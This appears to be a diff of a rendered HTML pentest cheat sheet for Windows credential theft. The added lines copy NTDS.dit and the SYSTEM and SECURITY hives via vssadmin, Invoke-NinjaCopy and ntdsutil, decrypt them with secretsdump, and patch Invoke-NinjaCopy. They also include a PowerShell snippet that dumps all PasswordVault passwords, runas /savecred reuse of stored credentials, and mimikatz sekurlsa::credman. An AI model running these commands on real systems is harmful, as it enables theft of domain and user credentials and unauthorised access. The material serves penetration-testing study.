@@ -852,7 +852,7 @@ reg<span class="w"> </span>save<span class="w"> </span>HKLM<span class="se">\s</
 <p>Decrypt the SAM database with Impacket's <code>secretsdump</code>:</p>
 <div class="highlight"><pre><span></span><code>secretsdump<span class="w"> </span>-sam<span class="w"> </span>sam<span class="w"> </span>-system<span class="w"> </span>system<span class="w"> </span>LOCAL
 </code></pre></div>
-<p>Exfiltrate NTDS.dit and SYSTEM registry hive (needed to decrypt the NTDS.dit) with <code>vssadmin</code>:</p>
+<p>Exfiltrate NTDS.dit and SYSTEM and SECURITY (optionally) registry hives (needed to decrypt the NTDS.dit) with <code>vssadmin</code>:</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># Create shadow copy volume</span>
 vssadmin<span class="w"> </span>create<span class="w"> </span>shadow<span class="w"> </span>/for<span class="o">=</span>C:
 
@@ -863,24 +863,30 @@ wmic<span class="w"> </span>shadowcopy<span class="w"> </span>call<span class="w
 <span class="c1"># Copy files from shadow volume</span>
 copy<span class="w"> </span>&lt;shadow<span class="w"> </span>copy<span class="w"> </span>name&gt;<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\N</span>TDS.dit<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\n</span>tds.dit.save
 copy<span class="w"> </span>&lt;shadow<span class="w"> </span>copy<span class="w"> </span>name&gt;<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>YSTEM<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\s</span>ystem.save
+<span class="o">[</span>copy<span class="w"> </span>&lt;shadow<span class="w"> </span>copy<span class="w"> </span>name&gt;<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>ECURITY<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\s</span>ecurity.save<span class="o">]</span>
 
 <span class="c1"># Delete shadow copy volume</span>
 vssadmin<span class="w"> </span>delete<span class="w"> </span>shadows<span class="w"> </span>/shadow<span class="o">=</span>&lt;shadow<span class="w"> </span>copy<span class="w"> </span>id&gt;
 </code></pre></div>
 <p>Note: using cmd instead of PowerShell <em>might</em> work better (I've experienced some issues with PS).</p>
-<p>Exfiltrate NTDS.dit and SYSTEM registry hive (needed to decrypt the NTDS.dit) with <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">Invoke-NinjaCopy.ps1</a> (stealthier than <code>vssadmin</code>):</p>
+<p>xfiltrate NTDS.dit and SYSTEM and SECURITY (optionally) registry hives (needed to decrypt the NTDS.dit) with <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">Invoke-NinjaCopy.ps1</a> (stealthier than <code>vssadmin</code>):</p>
 <div class="highlight"><pre><span></span><code><span class="nb">Invoke-NinjaCopy</span> <span class="n">-Path</span> <span class="s2">"C:\Windows\NTDS\NTDS.dit"</span> <span class="n">-LocalDestination</span> <span class="s2">"C:\Windows\Temp\ntds.dit.save"</span>
 <span class="nb">Invoke-NinjaCopy</span> <span class="n">-Path</span> <span class="s2">"C:\Windows\System32\config\SYSTEM"</span> <span class="n">-LocalDestination</span> <span class="s2">"C:\Windows\Temp\system.save"</span>
+<span class="nb">Invoke-NinjaCopy</span> <span class="n">-Path</span> <span class="s2">"C:\Windows\System32\config\SECURITY"</span> <span class="n">-LocalDestination</span> <span class="s2">"C:\Windows\Temp\security.save"</span>
 </code></pre></div>
 <p>If the "AmbiguousMatchException" is raised, try to patch the <code>Invoke-NinjaCopy.ps1</code> script as follows:</p>
 <ul>
 <li>Change the following line (910):   <code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')</code></li>
 <li>To: <code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);</code></li>
 </ul>
-<p>Parse and decrypt NTDS.dit with Impacket's <code>secretsdump</code>:</p>
-<div class="highlight"><pre><span></span><code>secretsdump<span class="w"> </span>-ntds<span class="w"> </span>ntds.dit.save<span class="w"> </span>-system<span class="w"> </span>system.save<span class="w"> </span>LOCAL
+<p>Extract the NTDS.dit and the SYSTEM registry hive with <code>ntdsutil</code>:</p>
+<div class="highlight"><pre><span></span><code>ntdsutil.exe<span class="w"> </span><span class="s1">'ac i ntds'</span><span class="w"> </span><span class="s1">'ifm'</span><span class="w"> </span><span class="s1">'create full c:\temp'</span><span class="w"> </span>q<span class="w"> </span>q
 </code></pre></div>
-<p>Note: for large NTDS.dit consider using <a href="https://github.com/c-sto/gosecretsdump">gosecretsdump</a> (faster).</p>
+<p>Parse and decrypt NTDS.dit with Impacket's <code>secretsdump</code>:</p>
+<div class="highlight"><pre><span></span><code>secretsdump<span class="w"> </span>-ntds<span class="w"> </span>ntds.dit.save<span class="w"> </span>-system<span class="w"> </span>system.save<span class="w"> </span><span class="o">[</span>-security<span class="w"> </span>security.save<span class="o">]</span><span class="w"> </span>LOCAL
+</code></pre></div>
+<p><strong>Note 1</strong>: for large NTDS.dit consider using <a href="https://github.com/c-sto/gosecretsdump">gosecretsdump</a> (faster).
+<strong>Note 2</strong>: having the SECURITY registry hive allows to obtain the machine account NTLM hash. </p>
 <p>Convert NTDS.dit to sqlite database:</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># Without SYSTEM registry hive</span>
 ntdsdotsqlite<span class="w"> </span>ntds.dit.save<span class="w"> </span>-o<span class="w"> </span>ntds.sqlite
@@ -984,7 +990,7 @@ reg<span class="w"> </span>query<span class="w"> </span>HKCU<span class="w"> </s
 <ul>
 <li><code>/f</code> specifies the keyword to search in registers.</li>
 </ul>
-<p>Search credentials in the Windows Credentials Manager:</p>
+<p>Search credentials in the Windows Credentials Manager (<strong>password ARE NOT shown</strong>):</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># list vaults</span>
 vaultcmd<span class="w"> </span>/list
 
@@ -993,6 +999,23 @@ VaultCmd<span class="w"> </span>/listproperties:<span class="s2">"&lt;vault name
 
 <span class="c1"># list credentials in a vault</span>
 VaultCmd<span class="w"> </span>/listcreds:<span class="s2">"&lt;vault name&gt;"</span>
+</code></pre></div>
+<p>Dump credentials from the Windows Credentials Manager (see <a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1">there</a>):</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$ClassHolder</span> <span class="p">=</span> <span class="p">[</span><span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">.</span><span class="n">PasswordVault</span><span class="p">,</span><span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">,</span><span class="n">ContentType</span><span class="p">=</span><span class="n">WindowsRuntime</span><span class="p">]</span>
+<span class="nv">$VaultObj</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">.</span><span class="n">PasswordVault</span>
+<span class="nv">$VaultObj</span><span class="p">.</span><span class="n">RetrieveAll</span><span class="p">()</span> <span class="p">|</span> <span class="k">foreach</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">RetrievePassword</span><span class="p">();</span> <span class="nv">$_</span> <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>List and use stored credentials with <code>runas</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># List available stored credentials </span>
+cmdkey<span class="w"> </span>/list
+
+<span class="c1"># Use store credentials</span>
+runas<span class="w"> </span>/savecred<span class="w"> </span>/user:&lt;user<span class="w"> </span>listed<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>previous<span class="w"> </span>command&gt;<span class="w"> </span>cmd.exe
+</code></pre></div>
+<p>Dump Windows Credentials Manager's passwords from memory with <code>mimikatz</code>:</p>
+<div class="highlight"><pre><span></span><code>privilege::debug
+sekurlsa::credman
 </code></pre></div>
 <h3 id="pass-the-attacks">Pass-the-* attacks</h3>
 <p>Perform a pass-the-password attack:</p>
